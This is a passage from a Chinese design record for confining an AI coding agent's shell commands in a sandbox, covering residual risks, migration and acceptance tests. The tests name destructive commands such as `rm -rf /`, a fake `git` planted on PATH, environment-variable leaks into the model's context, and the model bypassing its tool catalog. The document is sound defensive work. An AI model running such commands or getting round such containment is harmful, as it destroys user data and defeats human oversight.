- **围栏本身是新的攻击面**. 策略生成错误会让边界形同虚设, 因此决策 3 的行为自测是
  硬性前置, 不是可选项.
- **围栏关不住 Forge 自己**. 进程内文件工具要保留一条独立的边界检查路径 (决策 7.4),
  两条路径的边界定义必须一致, 否则会出现 shell 拦得住而 `fs.edit_file` 拦不住.
- **`accept_edits` 不再比 `auto` 更安全**, 界面文案必须改口, 否则是在误导用户.
- **macOS 的读边界仍是需要追赶的 denylist.** 本 ADR 消除了命令表的追赶压力, 但没有
  消除受保护路径表的 ---- 后者在 Linux 上由 bubblewrap 解决, 在 macOS 上没有解.
- **围栏看不见后果**: macOS 拿不到进程隔离, 且 socket 层分不出 `git fetch` 与
  `git push`. 两者合成一张约 25 条的表送 ASK ---- 这是唯一一处"漏一条有害"的残留
  (决策 7.3).

### 兼容性与迁移

- `POLICY_VERSION` 递增: 裁决判据变了, 既有 learned rules 必须失效.
- ADR-0024 整体作废 (快速放行由围栏取代).
- ADR-0015 §7.3 / §8.3 关于 OVERLAY 的两节作废.
- ADR-0015 "已知限制: `/undo` 不覆盖 `git.write`"一节作废, 改记为由 FULL 快照覆盖.
- ADR-0029 D 类决策据本 ADR 修订: `GIT_READ_ONLY_SUBCOMMANDS` 删除后重复消失,
  且 plan 档没有 `shell.run` 可用, 因此 `git.read` 保留并归入读取类.
- 恢复点格式与 `/undo` 行为不变, 既有 checkpoint 仍可还原.
- `domain/security/modes.py` 的能力预算表删除, 模式改为编译成围栏策略.
- 决策 8 的四步保证任一步都可以停下, 不存在"静态分析已删, 围栏还没好"的窗口.

## 验收标准

- 围栏自测三项 (工作区外写入, 受保护路径读取, 对外网络) 全部实测, 任一失败即
  `UNCONFINED`, 不存在中间档.
- 围栏运行期失效不会回退到更弱实现; 没有绕过围栏的宿主直连路径.
- 每次执行创建并销毁一个新实例.
- `rm -rf /`, `bash -lc 'rm -rf /'`, 脚本正文内的 root 删除, 在执行前被 Hard Deny 拒绝.
- `rm -rf src/` 允许执行, 且 `/undo` 能完整还原.
- 子进程写入的 `node_modules`, 编译输出保留在真实工作区.
- 静态分析产出的任何一项错误, 都无法导致跨栏访问成功 ---- 以红蓝对抗用例证明.
- `IsolationLevel` 只有两个成员, 且每个成员都有行为差异的消费方.
- **`env` 与 `printenv` 在围栏内的输出不含 allowlist 之外的任何变量** ----
  决策 7.1 的直接验收项, 红蓝对抗用例必须覆盖 "环境变量 -> 工作区文件 -> 模型上下文"
  这条链路.
- **工作区内写一个假 `git` 并让它进入 PATH, 不能被执行** ---- 决策 7.2 的验收项.
- **`kill` 一个宿主进程, 以及 `git push` / `npm publish`, 在所有模式
  (含 `full_access`) 下都触发 ASK** ---- 决策 7.3 的验收项.
- `plan` 档的 `ToolCatalog` 只含只读工具与计划工具, `shell.run` 与全部 `fs` 写工具
  不可见; 模型绕过目录直接请求时返回 `tool_unavailable_in_mode`.
- `plan` 档即使有子进程被起来 (目录被绕过, 或 MCP 工具声明了不诚实的能力上界),
  工作区写入仍在围栏层失败.
- **`fs.edit_file` 写工作区外路径被应用层拦下** ---- 决策 7.4 的验收项, 证明进程内
  工具不依赖围栏.
- 决策 6 的删除清单在决策 8 第 3 步的观测数据支持后才执行; 观测期内围栏拦截与静态
  判断的每一处不一致都有结论记录.
- 决策 8 第 1 步的 CoW 捕获耗时有实测数据, 并据此对"一律 FULL"做出书面结论.
- `make ci` 全绿.
